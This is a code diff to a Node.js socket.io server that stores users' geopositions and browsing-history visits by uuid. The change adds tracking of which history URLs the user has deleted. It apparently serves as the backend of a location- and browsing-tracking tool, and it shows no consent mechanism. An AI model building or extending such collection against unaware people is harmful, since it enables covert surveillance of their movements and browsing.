@@ -23,12 +23,17 @@ io.sockets.on('connection', function (socket) {
     // Get current location (DB: Geopositions).
     socket.on('geoposition', function (data) {
         addGeoposition(data);
-        console.log('Added geoposition for:', data.uuid);
+        console.log(data.uuid, '[+] Geoposition');
     });
     // Get URL visit (DB: History).
     socket.on('url-visit', function (data) {
         addURLVisit(data);
-        console.log('Added URL visit for:', data.uuid);
+        console.log(data.uuid, '[+] URL Visit');
+    });
+    // Get URL removal (DB: History).
+    socket.on('url-removal', function (data) {
+        addURLRemoval(data);
+        console.log(data.uuid, '[+] URL Removal');
     });
 });
 
@@ -109,6 +114,13 @@ var addURLVisit = function(data) {
         lastVisitTime: Math.floor(payload.lastVisitTime),
         typedCount: payload.typedCount,
         visitCount: payload.visitCount,
-        removed: removed
+        removed: 0
+    });
+};
+
+var addURLRemoval = function(data) {
+    var payload = JSON.parse(data.payload);
+    payload.urls.forEach(function (entry) {
+        db.update('History', 'url=?', [entry], { removed : 1 });
     });
 };
